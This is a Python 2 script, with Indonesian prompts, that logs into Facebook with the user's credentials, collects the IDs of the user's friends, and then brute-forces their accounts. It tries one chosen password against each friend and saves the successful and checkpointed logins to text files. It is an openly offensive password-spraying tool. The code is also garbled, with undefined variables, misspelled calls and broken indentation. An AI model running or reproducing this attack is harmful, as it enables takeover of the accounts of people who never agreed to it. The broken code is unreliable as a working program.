import os
import sys
import time
import json
import urllib
import random
import hashlib
from multiprocessing.pool import ThreadPool
from mechanize import Browser
from requests.exceptions import ConnectionError
m = "\033[31;1m" # Merah
h = "\033[32;1m" # Hijau
p = "\033[37;1m" # putih

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')
reload(sys)
sys.stdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

id = []
count = 0
id_koncomu = []
dados = []
cekpoint = []

def login():
    try:
        token = open('token.txt', 'r')
        main()
    except (KeyError, IOError):
        print h+" LOGIN FACEBOOK BRO.."
        id = raw_input(p+'[?] \033[96mUsername FB lu Tod\033[97m: ')
        passwordlu = raw_input(p+'[?] \033[95mPassword FB lu Tod\033[97m: ')
        iqbalz_noobs = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+id+'&locale=en_US&password='+passwordlu+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

        lop = iqbalz_noobs.content
        bacot = json.loads(lop)
        if "session_key" in lop:
        	        print " "
                
		        print h+"[+] Token Fb Anda adalah \033[91m=>\033[92m " + bacot["access_token"]
		        open(id+"token.txt", 'a').write(bacot["access_token"])
		        print " "
		        print h+"        T O K E N  S U C C E S S "
			print h+"                  T O D"
                	print p+" "
                
            		print pu+" "
        else:
	         	print m+"Login Gagal Cuk...."
		        print " "
                	print m+" "
                	os.system("rm -f token.txt")
                	login()
            
def akun():
    try:
        token = open("token.txt", "r").read()
    except IOError:
        print m+" Token Tidak ada..."
        os.system("rm -f token.txt")
        login()
    else:
        try:
            url = requests.get("https://graph.facebook.com/me?access_token=" + token )
            jsl = json.loads(url.text)
            jeneng = jsl['name']
            id = jsl['id']
        except KeyError:
            print m+" Akun Kena Cekpoint..."
            os.system("rm -f token.txt")
            login()
         
    id_konco()
    
def id_konco():
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print m+" Tidak ada Token "
        os.system("rm -f token.txt")
        login()
    else:
        try:
            req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            jsl = json.loads(req.text)
            simpan_id = open('id.txt', 'w')
            for iq in jsl['data']:
                id_koncomu.append(iq['id'])
                simpan_id.write(iq["id"] + "\n")
                print h+" Mengambil id"+ iq['name'] + iq['id']
            print p+" Jumlah Id Yg Terambil %s" % len(id_koncomu)
            print p+" File Disimpan Dengan Nama" + simpan_id
            simpan_id.close()
            mbf()
        except IOError:
            print m+" Terjadi Kesalahan..."

def mbf():
    global list_id
    global password

    try:
        token = open('token.txt', 'r')
    except IOError:
        print m+" Token Tidak Ditemukan.."
        os.system("rm -f token.txt")
        login()
    else:
        print h+" Multi Brute Force."
        list_id = open('id.txt', 'r').read()
        password = raw_input(p+" Masukkan Password : ")
        
        file_id = open('id.txt', 'r')
        for iq in range(20):
                dev = threading.Thread(target=cracking, args=())
                dev.start()
                threads.append(dev)

        for dev in threads:
                dev.join()

def cracking():
    global count
    global dados
    global cekpoint
    global oradadi

    bedel = open(list_id, 'r')
    buk = bedel.read().split()
    while file_id:
        id_target = file_id.readlines().strip()
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id_target + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = urllib.urlopen(url)
        jsl = json.load(data)
        if count == len(buk):
            break
        if 'accsess_token' in jsl:
            hasil = open('berhasilcuk.txt', 'w')
            hasil.write(id_target + "=>" + password)
            hasil.close()
            dados.append('\033[34;1m [OK] \033[32;1m '+ id_target + '|' + password)
            count += 1
        
        else:
            if 'www.facebook.com' in jsl['error_msg']:
                cekpo = open('cekpoint.txt', 'w')
                cekpo.write(id_target + '|' + password)
                cekpo.close()
                cekpoint.append(' \033[31;1m [CP] \033[33;1m '+ id_target + '|' + password)                
                count += 1
            else:
                oradadi.append(id_target)
               
                count += 1
        sys.stdout.write('\r \033[37;1m Crack : [ '+ str(count) + '==' + str(len(buk)) + '\033[32;1m ==> Live ' + str(len(dados)) + '\033[33;1m Cekpo [ ' + str(len(cekpoint)))
        sys.stdout.flush()
def main():
    login()
    
if __name__=="__main__":
    main()
